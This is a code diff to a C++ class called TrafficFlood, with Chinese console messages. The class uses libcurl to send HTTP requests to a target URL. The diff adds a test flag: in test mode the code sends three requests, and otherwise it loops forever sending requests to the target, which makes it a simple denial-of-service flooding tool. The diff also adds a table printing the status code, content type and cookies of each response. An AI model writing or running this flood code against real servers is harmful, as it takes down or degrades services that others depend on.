@@ -2,7 +2,10 @@
 
 #include <curl/curl.h>
 
+#include <iomanip>
 #include <iostream>
+
+bool isTest = true;
 
 size_t WriteCallback(void* contents, size_t size, size_t nmemb,
                      std::string* output) {
@@ -21,7 +24,22 @@ void TrafficFlood::Flood(std::string url) {
 
     std::cout << "|> 正在发送流量到目标: " << url + " = " + ip << std::endl;
 
-    for (int i = 0; i < 3; i++) HttpRequest(ip);
+    int counter = 0;
+
+    if (isTest) {
+        while (counter < 3) {
+            std::cout << "|> 第 " << (counter + 1) << " 次请求中..."
+                      << std::endl;
+            HttpRequest(ip);
+            counter++;
+        }
+    } else {
+        while (true) {
+            counter++;
+            std::cout << "|> 第 " << counter << " 次请求中..." << std::endl;
+            HttpRequest(ip);
+        }
+    }
 }
 
 int TrafficFlood::HttpRequest(std::string url) {
@@ -44,7 +62,44 @@ int TrafficFlood::HttpRequest(std::string url) {
         std::cerr << "|> cURL 请求失败: " << curl_easy_strerror(res)
                   << std::endl;
     } else {
-        std::cout << "|> 响应内容:\n" << response << std::endl;
+        struct curl_slist* headers = NULL;
+        res = curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &headers);
+
+        std::cout << "\n|> 响应信息表:\n";
+        std::cout << "+-----------------+------------------------+\n";
+        std::cout << "| 类型           | 值                     |\n";
+        std::cout << "+-----------------+------------------------+\n";
+
+        long response_code;
+
+        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
+        std::cout << "| 状态码         | " << response_code
+                  << std::setw(22 - std::to_string(response_code).length())
+                  << "|\n";
+
+        char* content_type;
+
+        curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
+        if (content_type) {
+            std::cout << "| 内容类型       | " << content_type
+                      << std::setw(22 - strlen(content_type)) << "|\n";
+        }
+
+        if (headers) {
+            std::cout << "| Cookie         | ";
+            struct curl_slist* curr = headers;
+            bool first = true;
+            while (curr) {
+                if (!first) std::cout << "                | ";
+                std::cout << curr->data << std::setw(22 - strlen(curr->data))
+                          << "|\n";
+                first = false;
+                curr = curr->next;
+            }
+            curl_slist_free_all(headers);
+        }
+
+        std::cout << "+-----------------+------------------------+\n";
     }
 
     curl_easy_cleanup(curl);
